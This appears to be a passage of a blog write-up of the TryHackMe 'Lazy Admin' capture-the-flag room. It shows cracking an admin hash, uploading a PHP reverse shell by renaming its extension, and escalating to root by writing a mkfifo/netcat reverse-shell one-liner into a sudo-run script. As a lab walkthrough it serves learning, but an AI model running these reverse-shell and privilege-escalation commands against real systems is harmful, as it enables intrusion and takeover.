+<p>Let’s crack. <a href="https://md5decrypt.net/" rel="external nofollow noopener" target="_blank">https://md5decrypt.net/</a></p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/crack-hash.png" alt="crack-hash"></p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: Password123</code></strong></em></p>
+
+<p>Now we can log in as an admin user. Let’s go to the /as/ directory and log in.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/home.png" alt="home"></p>
+
+<p>Now we can upload a reverse shell. So, I download pentest monkey’s <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" rel="external nofollow noopener" target="_blank">php-reverse-shell.php</a> and edit the php file. <code class="language-plaintext highlighter-rouge">($ip and $port)</code></p>
+
+<p>Then we go to the Post &gt; Create</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/post-create.png" alt="post-create"></p>
+
+<p>After, we can add a file below the page. (.php file isn’t working you must change the extension.)</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/below.png" alt="below"></p>
+
+<p>After the upload, the page looks like this.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/upload.png" alt="upload"></p>
+
+<p>Now, we set up a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 
+</code></pre></div></div>
+
+<p>Then we go to the <a href="http://10.10.103.31/content/attachment/shell.phtml" rel="external nofollow noopener" target="_blank">http://10.10.103.31/content/attachment/shell.phtml</a></p>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/inside.png" alt="inside"></p>
+
+<p>Now, let’s get to the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/user-flag.png" alt="user-flag"></p>
+
+<p><br></p>
+
+<h3 id="12-what-is-the-root-flag">1.2 What is the root flag?</h3>
+
+<p>Very surprisingly for www-data, we have sudo privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sudo-l.png" alt="sudo-l"></p>
+
+<p>The backup script is a Perl script that calls /etc/copy.sh</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/copy.png" alt="copy"></p>
+
+<p>Now we edit this copy.sh, file to get the root privilege.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; /etc/copy.sh 
+</code></pre></div></div>
+
+<p>Let’s setup a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 5555 
+</code></pre></div></div>
+
+<p>Let’s run the backup.pl file and get the root privilege.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo perl /home/itguy/backup.pl
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/privesc.png" alt="privesc"></p>
+
+<p>We are inside. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/root-flag.png" alt="root-flag"></p>
+
+<p><br></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br></p>
+
+  </div>
+  <div class="post__footer">
+    <p class="post__date">
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 28, 2023</p>
+    <div class="post__categories">
+      
+      
+      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
+            
+    </div>      
+    
+    <div class="post__tags">
+      <p class="post__tags-title">
+        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
+        <span class="post__tags-container">
+          
+          <span class="post__tags-item">security, linux</span>
+          
+        </span>
+      </p>
+    </div>
+    
+  </div>
+</div>
+<br>
+
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/tryhackme-lazy-admin/';
+    this.page.identifier = '/tryhackme-lazy-admin';
+    
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+</noscript>
+
+
+
+        </main>
+      </div>
+    </div>
+
+
+
+
+    <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
+    <footer>
+  <div class="footer">
+    © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
+  </div>
+</footer>
+
+    <!-- script -->
+    <script src="/assets/js/nav.js"></script>
+    <script src="/assets/js/clip.js"></script>
+    <script src="/assets/js/scroll-top.js"></script>
+    <script src="/assets/js/search.js"></script>
+    <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "TryHackMe - Lazy Admin",
+    "author": {
+      "@type": "Person",
+      "name": ""
+    },
+    "datePublished": "2023-03-28 00:00:00 +0300",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http://localhost:4000/tryhackme-lazy-admin/"
+    },
+    "articleSection": "TryHackMe"
+  }
+</script>
+  </body>
+</html>
